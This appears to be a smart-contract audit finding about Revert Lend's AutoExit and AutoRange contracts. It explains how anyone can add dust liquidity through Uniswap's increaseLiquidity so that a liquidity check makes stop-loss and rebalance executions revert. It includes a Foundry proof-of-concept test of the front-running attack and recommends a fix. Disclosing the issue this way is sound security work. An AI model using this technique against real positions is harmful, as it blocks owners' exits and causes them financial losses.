# [M] An attacker can DOS AutoExit and AutoRange transformers and incur losses for position owners

## Summary
Severity: Medium
Chain: Smart contract
Component: 2024-04-revert-mitigation
Published: 2024-04-28
Source: https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/66
Type: code-finding

## Details
# Lines of code

https://github.com/revert-finance/lend/blob/dcfa79924c0e0ba009b21697e5d42d938ad9e5e3/src/automators/AutoExit.sol#L130
https://github.com/revert-finance/lend/blob/dcfa79924c0e0ba009b21697e5d42d938ad9e5e3/src/transformers/AutoRange.sol#L139


# Vulnerability details

## Impact

An exploiter can block the execution of AutoExit and AutoRange transformers, which leads to the following consequences:
- `Limit orders` & `Stoploss orders` - position owners won't be able to exit a bad market and will suffer losses
- `Autorange orders` - positions that go out-of-range won't be rebalanced leading to missed profits or direct losses
 
## Vulnerability details

The `AutoRange.sol` and `AutoExit.sol` contracts serve the following functionality in Revert Lend:

- [`AutoRange.sol` contract](https://docs.revert.finance/revert/auto-range)
> Auto-Range automates the process of rebalancing your liquidity positions. When the token price moves and your position goes out-of-range by your selected percentage, the system then automatically rebalances your position`

- [`AutoExit` contract](https://docs.revert.finance/revert/auto-exit)
> Auto-Exit lets you pre-configure a position so that the liquidity is automatically withdrawn when the pool price reaches a predetermined value. Moreover, you can optionally configure the system to swap from one token to the other on withdrawal, providing a safety net for your investments akin to a stop-loss order.

Both of those contracts implement an `execute()` function that respectively transforms an NFT position based on the parameters provided to it. It can only be called by revert controlled bots (operators) which owners have approved for their position or by the `V3Vault` through it's `transform()` function.

The problem in both of those contracts is that the `execute()` function includes a validation that allows malicious users to DOS transaction execution and thus compromise the safety and integrity of the managed positions.

`AutoExit::execute()`

https://github.com/revert-finance/lend/blob/audit/src/automators/AutoExit.sol#L130
```solidity
 function execute(ExecuteParams calldata params) external {
        ....       
 
        // get position info
        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =
            nonfungiblePositionManager.positions(params.tokenId);

        ....
        
        // @audit can be front-run and prevent execution
        if (state.liquidity != params.liquidity) {
            revert LiquidityChanged();
        }

        ....
    }
```

`AutoRange::execute()`

https://github.com/revert-finance/lend/blob/audit/src/transformers/AutoRange.sol#L139
```solidity
function execute(ExecuteParams calldata params) external {
        ....       
 
        // get position info
        (,, state.token0, state.token1, state.fee, state.tickLower, state.tickUpper, state.liquidity,,,,) =
            nonfungiblePositionManager.positions(params.tokenId);
        
        // @audit can be front-run and prevent execution
        if (state.liquidity != params.liquidity) {
            revert LiquidityChanged();
        }

        ....
    }
```

The problematic validation shared in both function is this one:

```solidity
// @audit can be front-run and prevent execution
      if (state.liquidity != params.liquidity) {
          revert LiquidityChanged();
      }
```

The check is meant to ensure that the execution parameters the transaction was initiated with, are executed under the same conditions (the same liquidity) that were present when revert bots calculated them off-chain.

The main issue here arises from the fact that liquidity of a position inside `NonfungiblePositionManager` can be manipulated by anyone. More specifically `NonfungiblePositionManager::increaseLiquidity()` can be called freely, which means that liquidity can be added to any NFT position without restriction.

This can be validated by looking at `NonfungiblePositionManager::increaseLiquidity()`

https://github.com/Uniswap/v3-periphery/blob/697c2474757ea89fec12a4e6db16a574fe259610/contracts/NonfungiblePositionManager.sol#L198C14-L198C31

```solidity
 function increaseLiquidity(IncreaseLiquidityParams calldata params)
        external
        payable
        override     //<---------- No `isAuthorizedForToken` modifier - anyone can call
        checkDeadline(params.deadline)
        returns (
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        )
    { ... }

....

function decreaseLiquidity(DecreaseLiquidityParams calldata params)
        external
        payable
        override
        isAuthorizedForToken(params.tokenId) // <------- Only position owner can call
        checkDeadline(params.deadline)
        returns (uint256 amount0, uint256 amount1)
    { ... }
```

All of this allows any attacker to exploit the check at practically zero cost

## POC
I've coded a POC to prove how for the cost of `1 wei` (basically free) an attacker prevents a stop loss order for a position from being executed.

I've added the following test to `AutoExit.t.sol`, reusing the logic from the `testStopLoss()` test

```solidity
function testExploitStopLoss() external {
        vm.prank(TEST_NFT_2_ACCOUNT);
        NPM.setApprovalForAll(address(autoExit), true);

        vm.prank(TEST_NFT_2_ACCOUNT);
        autoExit.configToken(
            TEST_NFT_2,
            AutoExit.PositionConfig(
                true,
                true,
                true,
                -84121,
                -78240,
                uint64(Q64 / 100),
                uint64(Q64 / 100),
                false,
                MAX_REWARD
            )
        ); // 1% max slippage

        (, , , , , , , uint128 liquidity, , , , ) = NPM.positions(TEST_NFT_2);

        // create a snapshot of state before transformation
        uint256 snapshot = vm.snapshot();

        // --- NORMAL SCENARIO ---

        // executes correctly
        vm.prank(OPERATOR_ACCOUNT);
        autoExit.execute(
            AutoExit.ExecuteParams(
                TEST_NFT_2,
                _getWETHToDAISwapData(),
                liquidity,
                0,
                0,
                block.timestamp,
                MAX_REWARD
            )
        );

        // --- ATTACKER SCENARIO ---

        // go back to the state before transformation
        // and replay the scenario with front-running
        vm.revertTo(snapshot);

        // random attacker address
        address attacker = address(101);
        deal(address(WETH_ERC20), attacker, 10_000);

        // attacker sends dust amount to change liquidity
        vm.startPrank(attacker);
        WETH_ERC20.approve(address(NPM), 1);
        (, , uint256 amount1) = NPM.increaseLiquidity(
            INonfungiblePositionManager.IncreaseLiquidityParams(
                TEST_NFT_2,
                0,
                1,
                0,
                0,
                block.timestamp
            )
        );
        vm.stopPrank();

        // liquidity increased by 1 wei
        assertEq(amount1, 1);

        // AutoExit is DOSed and StopLoss was blocked
        vm.prank(OPERATOR_ACCOUNT);
        // reverts with liquidity changed
        vm.expectRevert(Constants.LiquidityChanged.selector);
        autoExit.execute(
            AutoExit.ExecuteParams(
                TEST_NFT_2,
                _getWETHToDAISwapData(),
                liquidity,
                0,
                0,
                block.timestamp,
                MAX_REWARD
            )
        );
    }
```

## Recommended mitigation steps

Consider removing the problematic check from both functions, since it can cause more harm than good in this particular scenario.


## Assessed type

DoS
